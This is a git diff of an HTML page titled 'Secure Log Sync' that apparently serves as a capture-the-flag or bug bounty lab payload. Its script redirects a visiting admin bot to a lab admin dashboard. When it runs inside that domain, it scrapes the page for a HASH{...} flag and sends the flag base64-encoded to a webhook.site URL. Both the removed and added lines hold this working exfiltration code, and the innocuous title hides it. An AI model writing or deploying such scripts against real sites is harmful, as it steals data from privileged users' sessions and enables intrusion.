@@ -3,25 +3,30 @@
 <head><title>Secure Log Sync</title></head>
 <body>
     <script>
-        const webhook = "https://webhook.site/ab7f9788-3a2f-41f5-9c2d-84fb65487cc8";
-        
-        // 1. If this is loaded as a script from the lab:
-        const hunt = () => {
-            const t = document.body.innerText;
-            const f = t.match(/HASH\{[^}]+\}/);
-            if (f) {
-                fetch(webhook + "?WIN=" + btoa(f[0]));
-            } else {
-                setTimeout(hunt, 1000);
-            }
-        };
+       // GitHub: sajaabuhussein.github.io/trigger.html
+const webhook = "https://webhook.site/ab7f9788-3a2f-41f5-9c2d-84fb65487cc8";
 
-        if (window.location.host.includes("hashacademy")) {
-            setTimeout(hunt, 3000);
-        } else {
-            // 2. If the bot is just visiting the GitHub page:
-            window.location.href = "https://bugbounty-exam.hashacademy.co/admin/dashboard";
-        }
+const hunt = () => {
+    const bodyText = document.body.innerText;
+    const match = bodyText.match(/HASH\{[^}]+\}/);
+    
+    if (match) {
+        // SUCCESS: Flag found!
+        fetch(webhook + "?WIN=" + btoa(match[0]));
+    } else {
+        // RETRY: Flag not rendered yet (waiting for hydration)
+        setTimeout(hunt, 1000);
+    }
+};
+
+// If the script is running INSIDE the lab domain
+if (window.location.host.includes("hashacademy")) {
+    // Wait 3 seconds for the initial dashboard skeleton to fill with data
+    setTimeout(hunt, 3000);
+} else {
+    // If the AdminBot is visiting the GitHub page directly, send it to the lab
+    window.location.href = "https://bugbounty-exam.hashacademy.co/admin/dashboard";
+}
     </script>
 </body>
 </html>
